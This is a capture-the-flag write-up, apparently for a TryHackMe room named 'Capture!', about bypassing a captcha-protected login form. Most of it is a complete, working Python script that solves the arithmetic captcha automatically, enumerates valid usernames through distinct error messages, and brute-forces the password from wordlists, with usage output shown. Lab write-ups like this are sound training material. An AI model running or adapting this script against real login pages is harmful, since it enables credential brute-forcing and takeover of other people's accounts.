# Capture!
Can you bypass the login form?
## Analysis the login form
- In first, Launch the machine and capture the IP then access the login form, the web application will redirect you directly to this URL `http://MACHINE_IP/login`.

![Login Form.png](https://github.com/Sec0gh/python-scripts/blob/main/Capture!%20THM%20Room/Login%20Form.png)

- If you tried to test any random usernames and passwords many times, the application will return an error message with `Too many bad login attempts!` and needs to solve the captcha to send again the request to the server to check that.
- Without sending a valid `captcha code`, your request to authenticate will not be valid.

![Captcha enabled.png](https://github.com/Sec0gh/python-scripts/blob/main/Capture!%20THM%20Room/Captcha%20enabled.png)

## Getting the captcha code

- So in these cases, i get one's way to python and i started to write this python script to get the `captcha code`, and to get the `captcha code` you will do one of 3 operations summation,  substitution, or multiplication:
```python
import requests
from termcolor import colored
from re import search, sub, split
from argparse import ArgumentParser

def get_captcha_code(url):
        data = {"username": "sec0gh", "password": "sec0gh"}
        response = requests.post(url, data=data)
        captcha_Str = search(r'\d+\s*[-+*]\s*\d+ = \?', response.text)
        if captcha_Str:
            captcha_Str = captcha_Str.group()     # To get the intended matching string like (123 + 456 = ?) 
            print(captcha_Str)
            captcha_Str = sub(r' = \?', '', captcha_Str)      # Replace this section with nothing to remove ( = ?)
            print(captcha_Str)
            numbers = split(r'\s*[-+*]\s*', captcha_Str)   # Split the captcha string based on the operation type (+,-,or *)

            # print(numbers) ==>  ['123', '456']     

            num1 = int(numbers[0])
            num2 = int(numbers[1])
            if '+' in captcha_Str:
                captcha_code = num1 + num2
                print(captcha_code)
                return captcha_code
            elif '-' in captcha_Str:
                captcha_code = num1 - num2
                print(captcha_code)
                return captcha_code
            elif '*' in captcha_Str:
                captcha_code = num1 * num2
                print(captcha_code)
                return captcha_code
        else:
            print("No captcha found.")
```
## Username enumeration

- Then if you entered a valid captcha code without a valid username, the web application will send an error message with `The user 'sec0gh' does not exist`.
- So now we will try to enumerate a valid user by brute-forcing all usernames with `the usernames list in the required files of the room` and sending that with the valid captcha we got in order to send a valid request to authenticate.
- When you see the response in the source page, you will find there is an HTML encoding for the error message that we saw, so we will embed this error message in the code to match that if we found this message in the source page, the username will be invalid and otherwise the username will be valid.

![Username not valid.png](https://github.com/Sec0gh/python-scripts/blob/main/Capture!%20THM%20Room/Username%20not%20valid.png)

```python
def username_enum(url,usernames_list):
    with open(f'{usernames_list}','r') as file:   # Access the path of usernames list.
        for username in file:
            username = username.strip()
            captcha_code = get_captcha_code(url)
            data = {"username": username, "password": "sec0gh", "captcha": captcha_code}
            response = requests.post(url, data=data)    
            
            if f"The user &#39;{username}&#39; does not exist" in response.text:
                print(colored("Invalid user.",'red'))
            else:
                print(colored("Valid user is found: "+ username,"green")) 
                return username
```

## Password enumeration

- And after we found the valid user, we will go to enumerate the valid password for the valid username that we found in the same way.
- Use the passwords list in the required files of the room.
```python
def password_enum(username,url,passwords_list):
    with open(f'{passwords_list}','r') as file:    # Access the path of passwords list.
        for password in file:
            password = password.strip()
            captcha_code = get_captcha_code(url)
            data = {"username": username, "password": password, "captcha": captcha_code}
            response = requests.post(url, data=data) 
            
            if f"Invalid password for user &#39;{username}&#39;" in response.text:
                print(colored("Invalid password.",'red'))
            else:
                print(colored("Valid password is found: "+ password,"green")) 
                return password
```
- No problem providing the code with some arguments to easily pass the lists and the URL of the machine.
```python
def parse_args():
    example = '''
    Example:
    python3 exploit.py -u http://Target_IP/login -ul /path/usernames.txt -pl /path/passwords.txt"
    '''
    parser = ArgumentParser(epilog=example,description='Retrieve the valid credentials using a valid captcha code')
    parser.add_argument('-u', '--url', required=True, help='The target URL')
    parser.add_argument('-ul', '--usernames-list', required=True, type= str, help='Pass the usernames list path')
    parser.add_argument('-pl', '--passwords-list', required=True, help='Pass the passwords list path')
    args = parser.parse_args()
    return args
```
- Finally, we will retrieve the valid credentials.
```python
def main():
    args = parse_args() 
    username = username_enum(args.url, args.usernames_list)
    password = password_enum(username, args.url,args.passwords_list)
    
    print("The valid credentials found:")
    print(f"Username: {username}")
    print(f"Password: {password}")


if __name__ == "__main__":
    main()
```
- The full script will be like that:
```python
import requests
from termcolor import colored
from re import search, sub, split
from argparse import ArgumentParser

def get_captcha_code(url):
        data = {"username": "sec0gh", "password": "sec0gh"}
        response = requests.post(url, data=data)
        captcha_Str = search(r'\d+\s*[-+*]\s*\d+ = \?', response.text)
        if captcha_Str:
            captcha_Str = captcha_Str.group()     # To get the intended matching string like (123 + 456 = ?) 
            print(captcha_Str)
            captcha_Str = sub(r' = \?', '', captcha_Str)      # Replace this section with nothing to remove ( = ?)
            print(captcha_Str)
            numbers = split(r'\s*[-+*]\s*', captcha_Str)   # Split the captcha string based on the operation type (+,-,or *)

            # print(numbers) ==>  ['123', '456']     

            num1 = int(numbers[0])
            num2 = int(numbers[1])
            if '+' in captcha_Str:
                captcha_code = num1 + num2
                print(captcha_code)
                return captcha_code
            elif '-' in captcha_Str:
                captcha_code = num1 - num2
                print(captcha_code)
                return captcha_code
            elif '*' in captcha_Str:
                captcha_code = num1 * num2
                print(captcha_code)
                return captcha_code
        else:
            print("No captcha found.")


def username_enum(url,usernames_list):
    with open(f'{usernames_list}','r') as file:   # Access the path of usernames list.
        for username in file:
            username = username.strip()
            captcha_code = get_captcha_code(url)
            data = {"username": username, "password": "sec0gh", "captcha": captcha_code}
            response = requests.post(url, data=data)    
            
            if f"The user &#39;{username}&#39; does not exist" in response.text:
                print(colored("Invalid user.",'red'))
            else:
                print(colored("Valid user is found: "+ username,"green")) 
                return username
                
                
def password_enum(username,url,passwords_list):
    with open(f'{passwords_list}','r') as file:    # Access the path of passwords list.
        for password in file:
            password = password.strip()
            captcha_code = get_captcha_code(url)
            data = {"username": username, "password": password, "captcha": captcha_code}
            response = requests.post(url, data=data) 
            
            if f"Invalid password for user &#39;{username}&#39;" in response.text:
                print(colored("Invalid password.",'red'))
            else:
                print(colored("Valid password is found: "+ password,"green")) 
                return password
    
    
def parse_args():
    example = '''
    Example:
    python3 exploit.py -u http://Target_IP/login -ul /path/usernames.txt -pl /path/passwords.txt"
    '''
    parser = ArgumentParser(epilog=example,description='Retrieve the valid credentials using a valid captcha code')
    parser.add_argument('-u', '--url', required=True, help='The target URL')
    parser.add_argument('-ul', '--usernames-list', required=True, type= str, help='Pass the usernames list path')
    parser.add_argument('-pl', '--passwords-list', required=True, help='Pass the passwords list path')
    args = parser.parse_args()
    return args
       
           
def main():
    args = parse_args() 
    username = username_enum(args.url, args.usernames_list)
    password = password_enum(username, args.url,args.passwords_list)
    
    print("The valid credentials found:")
    print(f"Username: {username}")
    print(f"Password: {password}")


if __name__ == "__main__":
    main()
```

## Usage
```
$ python3 exploit.py -h
usage: exploit.py [-h] -u URL -ul USERNAMES_LIST -pl PASSWORDS_LIST

Retrieve the valid credentials using a valid captcha code

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     The target URL
  -ul USERNAMES_LIST, --usernames-list USERNAMES_LIST
                        Pass the usernames list path
  -pl PASSWORDS_LIST, --passwords-list PASSWORDS_LIST
                        Pass the passwords list path

Example: python3 exploit.py -u http://Target_IP/login -ul /path/usernames.txt -pl /path/passwords.txt"
```


- The output will contain like these images:

![Valid user](https://github.com/Sec0gh/python-scripts/blob/main/Capture!%20THM%20Room/Valid%20user.png)

![Valid password](https://github.com/Sec0gh/python-scripts/blob/main/Capture!%20THM%20Room/Valid%20password.png)

- After successfully obtaining a valid username and password, I proceeded to authenticate using these credentials in order to obtain the flag.

![Flag.png](https://github.com/Sec0gh/python-scripts/blob/main/Capture!%20THM%20Room/Flag.png)
